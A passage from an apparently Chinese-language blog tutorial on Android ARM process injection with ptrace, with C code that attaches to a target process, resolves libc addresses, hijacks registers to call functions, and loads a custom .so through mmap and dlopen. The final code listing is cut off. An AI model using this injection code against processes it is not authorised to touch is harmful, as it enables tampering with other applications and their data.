class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">union</span> u &#123;</span><br><span class="line">            <span class="keyword">long</span> val;</span><br><span class="line">            <span class="keyword">char</span> chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = len / long_size;</span><br><span class="line">    laddr = str;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child,</span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        laddr += long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j = len % long_size;</span><br><span class="line">    <span class="keyword">if</span>(j != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(data.chars, laddr, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child,</span><br><span class="line">               addr + i * <span class="number">4</span>, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *pch;</span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(filename, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, module_name)) &#123;</span><br><span class="line">                pch = strtok( line, <span class="string">"-"</span> );</span><br><span class="line">                addr = strtoul( pch, <span class="literal">NULL</span>, <span class="number">16</span> );</span><br><span class="line">                <span class="keyword">if</span> (addr == <span class="number">0x8000</span>)</span><br><span class="line">                    addr = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp) ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">get_remote_addr</span><span class="params">(<span class="keyword">pid_t</span> target_pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name, <span class="keyword">void</span>* local_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* local_handle, *remote_handle;</span><br><span class="line">    local_handle = get_module_base(<span class="number">0</span>, module_name);</span><br><span class="line">    remote_handle = get_module_base(target_pid, module_name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"module_base: local[%p], remote[%p]\n"</span>, local_handle, remote_handle);</span><br><span class="line">    <span class="keyword">long</span> ret_addr = (<span class="keyword">long</span>)((<span class="keyword">uint32_t</span>)local_addr + (<span class="keyword">uint32_t</span>)remote_handle - (<span class="keyword">uint32_t</span>)local_handle);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"remote_addr: [%p]\n"</span>, (<span class="keyword">void</span>*) ret_addr); </span><br><span class="line">    <span class="keyword">return</span> ret_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">long</span> addr, <span class="keyword">long</span> *params, <span class="keyword">uint32_t</span> num_params, struct pt_regs* regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_params &amp;&amp; i &lt; <span class="number">4</span>; i ++) &#123;</span><br><span class="line">        regs-&gt;uregs[i] = params[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// push remained params onto stack</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; num_params) &#123;</span><br><span class="line">        regs-&gt;ARM_sp -= (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>) ;</span><br><span class="line">        putdata(pid, (<span class="keyword">long</span>)regs-&gt;ARM_sp, (<span class="keyword">char</span>*)&amp;params[i], (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    regs-&gt;ARM_pc = addr;</span><br><span class="line">    <span class="keyword">if</span> (regs-&gt;ARM_pc &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* thumb */</span></span><br><span class="line">        regs-&gt;ARM_pc &amp;= (~<span class="number">1u</span>);</span><br><span class="line">        regs-&gt;ARM_cpsr |= CPSR_T_MASK;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* arm */</span></span><br><span class="line">        regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK;</span><br><span class="line">    &#125;</span><br><span class="line">    regs-&gt;ARM_lr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ptrace_setregs(pid, regs) == <span class="number">-1</span></span><br><span class="line">            || ptrace_continue(pid) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;</span><br><span class="line">    waitpid(pid, &amp;stat, WUNTRACED);</span><br><span class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptrace_continue(pid) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        waitpid(pid, &amp;stat, WUNTRACED);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inject</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">old_regs</span>,<span class="title">regs</span>;</span></span><br><span class="line">    <span class="keyword">long</span> sleep_addr;</span><br><span class="line">    <span class="comment">//save old regs</span></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;old_regs);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;regs, &amp;old_regs, <span class="keyword">sizeof</span>(regs));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"getting remote sleep_addr:\n"</span>);</span><br><span class="line">    sleep_addr = get_remote_addr(pid, libc_path, (<span class="keyword">void</span> *)sleep);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> parameters[<span class="number">1</span>];</span><br><span class="line">    parameters[<span class="number">0</span>] = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    ptrace_call(pid, sleep_addr, parameters, <span class="number">1</span>, &amp;regs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//restore old regs</span></span><br><span class="line">    ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, &amp;old_regs);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: %s &lt;pid to be traced&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> != ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Trace process failed:%d.\n"</span>, errno);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    inject(pid);</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_DETACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关于waitpid"><a href="#关于waitpid" class="headerlink" title="关于waitpid"></a>关于waitpid</h2><p>详细介绍可看<a href="https://support.sas.com/documentation/onlinedoc/sasc/doc/lr2/wait.htm" target="_blank" rel="noopener">官方文档</a>.</p><h3 id="参数status"><a href="#参数status" class="headerlink" title="参数status"></a>参数status</h3><p>wait函数调用过后,status指针指向可以被宏解析的值,这些宏在ndk目录下platforms/android-21/arch-arm/usr/include/sys/wait.h文件中定义.<br>高2字节用于表示导致子进程的退出或暂停状态信号值(WTERMSIG)，低2字节表示子进程是退出(0x0)还是暂停(0x7f)状态(WEXITSTATUS)。<br>如:0xb7f就表示子进程为暂停状态，导致它暂停的信号量为11即sigsegv错误。<br>关于错误代码的文档可看<a href="https://support.sas.com/documentation/onlinedoc/sasc/doc/lr1/lrv1ch5.htm" target="_blank" rel="noopener">这里</a>,<br>定义在ndk目录下platforms/android-21/arch-arm/usr/include/asm/signal.h中.</p><blockquote><p>其中两个宏:<br>WEXITSTATUS(<em>statusPtr):<br>if the child process terminates normally, this macro evaluates to the lower 8 bits of the value passed to the exit or _exit function or returned from main.<br>WTERMSIG(</em>statusPtr)<br>if the child process ends by a signal that was not caught, this macro evaluates to the number of that signal.</p></blockquote><h3 id="参数options"><a href="#参数options" class="headerlink" title="参数options"></a>参数options</h3><p>指定了waitpid的额外行动.选项有:</p><ul><li>WNOHANG:<br>告诉waitpid不等程序中止立即返回status信息.<br>正常情况是当主进程对子进程使用了waitpid,主进程就会阻塞直到waitpid返回status信息;如果指定了WNOHANG选项,主进程就不会阻塞了.<br>如果还没有可用的status信息,waitpid返回0.</li><li>WUNTRACED:<br>告诉waitpid，如果子进程进入暂停状态或者已经终止，那么就立即返回status信息,正常情况是子进程终止的时候才返回.<br>如果是被ptrace的子进程，那么即使不提供WUNTRACED参数，也会在子进程进入暂停状态的时候立即返回。<br>对于使用ptrace_cont运行的子进程，它会在3种情况下进入暂停状态：①下一次系统调用；②子进程退出；③子进程的执行发生错误。<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3>程序中的0xb7f就表示子进程进入了暂停状态，且发送的错误信号为11(SIGSEGV)，它表示试图访问未分配给自己的内存, 或试图往没有写权限的内存地址写数据。<br>当子进程执行完注入的函数后，由于我们在前面设置了regs-&gt;ARM_lr = 0，它就会返回到0地址处继续执行，这样就会产生SIGSEGV了.</li></ul><h2 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h2><p>正常的情况是target程序每秒输出一句话，但是用hook3程序hook后，就会暂停10秒钟的时间，因为我们利用ptrace运行了sleep(10)在目标程序中。</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo3bly0dahj318u0ooh6r.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fo3bo4h798j30vm0g67e0.jpg" alt=""></p><h1 id="利用Ptrace动态加载so并执行自定义函数"><a href="#利用Ptrace动态加载so并执行自定义函数" class="headerlink" title="利用Ptrace动态加载so并执行自定义函数"></a>利用Ptrace动态加载so并执行自定义函数</h1><h2 id="总体思路-1"><a href="#总体思路-1" class="headerlink" title="总体思路"></a>总体思路</h2><ul><li>保存当前寄存器的状态</li><li>获取目标程序的mmap, dlopen, dlsym, dlclose函数地址</li><li>调用mmap分配空间保存参数信息</li><li>调用dlopen加载so库</li><li>调用dlsym找到目标函数地址</li><li>执行目标函数</li><li>调用dlclose卸载so库</li><li>恢复寄存器的状态</li></ul><h2 id="保存当前寄存器的状态"><a href="#保存当前寄存器的状态" class="headerlink" title="保存当前寄存器的状态"></a>保存当前寄存器的状态</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> <span class="title">old_regs</span>,<span class="title">regs</span>;</span></span><br><span class="line">ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, &amp;old_regs);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;regs,&amp;old_regs,<span class="keyword">sizeof</span>(regs));</span><br></pre></td></tr></table></figure><h2 id="获取目标程序的mmap-dlopen-dlsym-dlclose函数地址"><a href="#获取目标程序的mmap-dlopen-dlsym-dlclose函数地址" class="headerlink" title="获取目标程序的mmap, dlopen, dlsym, dlclose函数地址"></a>获取目标程序的mmap, dlopen, dlsym, dlclose函数地址</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> mmap_addr,dlopen_addr,dlsym_addr,dlclose_addr;</span><br><span class="line">mmap_addr = get_remote_addr(pid, libc_path, (<span class="keyword">void</span>*)mmap);</span><br><span class="line">dlopen_addr = get_remote_addr(pid, libc_path, (<span class="keyword">void</span>*)dlopen);</span><br><span class="line">dlsym_addr = get_remote_addr(pid, libc_path, (<span class="keyword">void</span>*)dlsym);</span><br><span class="line">dlclose_addr = get_remote_addr(pid, libc_path, (<span class="keyword">void</span>*)dlclose);</span><br></pre></td></tr></table></figure><h2 id="调用mmap分配空间保存参数信息"><a href="#调用mmap分配空间保存参数信息" class="headerlink" title="调用mmap分配空间保存参数信息"></a>调用mmap分配空间保存参数信息</h2><p>mmap的原型如下:<br><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code><br>参数    描述</p><ul><li>addr    映射的起始地址,为0表示由系统决定映射的起始地址</li><li>length    映射的长度</li><li>prot    映射的内存保存属性,不能与文件的打开模式冲突</li><li>flags    指定映射对象的类型,映射选项和映射页是否可以共享</li><li>fd    有效的文件描述符,一般是由open()函数返回;其值也可以设置为-1,此时需要指定flags参数中的MAP_ANON,表明进行的是匿名映射</li><li>offset    被映射对象内容的起点</li></ul><p>这里我们需要的调用语句是<br><code>mmap(0,0x4000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANONYMOUS|MAP_PRIVATE,0,0)</code></p><ul><li>PROT_EXEC表示可执行.</li><li>PROT_READ表示可读.</li><li>PROT_WRITE表示可写.</li><li>MAP_PRIVATE表示建立一个写入时拷贝的私有映射.内存区域的写入不会影响到原文件.这个标志和以上标志是互斥的,只能使用其中一个.</li><li>MAP_ANONYMOUS表示匿名映射,映射区不与任何文件关联.</li></ul><p>mmap()可以用来将一个文件或者其它对象映射进内存，如果我们把flag设置为MAP_ANONYMOUS并且把参数fd设置为0的话就相当于直接映射一段内容为空的内存。<br>则:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> parameters[<span class="number">10</span>];    </span><br><span class="line">parameters[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">//构造参数</span></span><br><span class="line">parameters[<span class="number">1</span>] = <span class="number">0x4000</span>;</span><br><span class="line">parameters[<span class="number">2</span>] = PROT_READ | PROT_WRITE | PROT_EXEC;</span><br><span class="line">parameters[<span class="number">3</span>] = MAP_ANONYMOUS | MAP_PRIVATE;</span><br><span class="line">parameters[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">parameters[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">ptrace_call(pid,mmap_addr,parameters,<span class="number">6</span>,&amp;regs);</span><br><span class="line"><span class="comment">//调用结束后获得r0中保存的返回值</span></span><br><span class="line">ptrace(PTRACE_GETREGS,pid,<span class="literal">NULL</span>,&amp;regs);</span><br><span class="line"><span class="keyword">long</span> mapping_base = regs.ARM_r0;</span><br></pre></td></tr></table></figure></p><p>在我们使用ptrace_call(pid, mmap_addr, parameters, 6, &amp;regs)调用完mmap()函数之后，要记得使用ptrace(PTRACE_GETREGS, pid, NULL, &amp;regs); 用来获取保存返回值的regs.ARM_r0，这个返回值也就是映射的内存的起始地址。<br>mmap()映射的内存主要用来保存我们传给其他函数的参数。比如接下来我们需要用dlopen()去加载”/data/local/tmp/libinject.so”这个文件，所以我们需要先用putdata()将”/data/local/tmp/libinject.so”这个字符串放置在mmap()所映射的内存中，然后就可以将这个映射的地址作为参数传递给dlopen()了。接下来的dlsym()，so中的目标函数，dlclose()都是相同调用的方式，这里就不一一赘述了。</p><h2 id="调用dlsym找到目标函数地址"><a href="#调用dlsym找到目标函数地址" class="headerlink" title="调用dlsym找到目标函数地址"></a>调用dlsym找到目标函数地址</h2><p>原型:<br>void <em>dlsym(void </em>handle, const char *symbol);<br>参数    描述<br>handle    so库的基址<br>symbol    函数名地址<br>这里我们需要的调用语句是dlsym(handle, function_name),则:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">writeData(pid, mapping_base, function_name, <span class="built_in">strlen</span>(function_name)+<span class="number">1</span>);</span><br><span class="line">parameters[<span class="number">0</span>] = handle;</span><br><span class="line">parameters[<span class="number">1</span>] = mapping_base;</span><br><span class="line">ptrace_call(pid, dlsym_addr, parameters, <span class="number">2</span>, &amp;regs);</span><br><span class="line">ptrace(PTRACE_GETREGS,pid,<span class="literal">NULL</span>,&amp;regs); <span class="comment">//调用结束后获得r0中保存的返回值</span></span><br><span class="line"><span class="keyword">long</span> function_addr = regs.ARM_r0;</span><br></pre></td></tr></table></figure></p><h2 id="执行目标函数"><a href="#执行目标函数" class="headerlink" title="执行目标函数"></a>执行目标函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">writeData(pid, mapping_base, function_parameters, <span class="built_in">strlen</span>(function_parameters)+<span class="number">1</span>);</span><br><span class="line">parameters[<span class="number">0</span>] = mapping_base;</span><br><span class="line">ptrace_call(pid, function_addr, parameters, <span class="number">1</span>, &amp;regs);</span><br></pre></td></tr></table></figure><h2 id="调用dlclose卸载so库"><a href="#调用dlclose卸载so库" class="headerlink" title="调用dlclose卸载so库"></a>调用dlclose卸载so库</h2><p>原型:<code>int dlclose(void *handle);</code><br>则:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parameters[<span class="number">0</span>] = handle;</span><br><span class="line">ptrace_call(pid,dlclose_addr,parameters,<span class="number">1</span>,&amp;regs);</span><br></pre></td></tr></table></figure></p><h2 id="恢复寄存器的状态"><a href="#恢复寄存器的状态" class="headerlink" title="恢复寄存器的状态"></a>恢复寄存器的状态</h2><p><code>ptrace(PTRACE_SETREGS,pid,NULL,&amp;old_regs);</code></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CPSR_T_MASK     ( 1u &lt;&lt; 5 )</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *libc_path = <span class="string">"/system/lib/libc.so"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> long_size = <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_setregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs * regs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"ptrace_setregs: Can not set register values"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 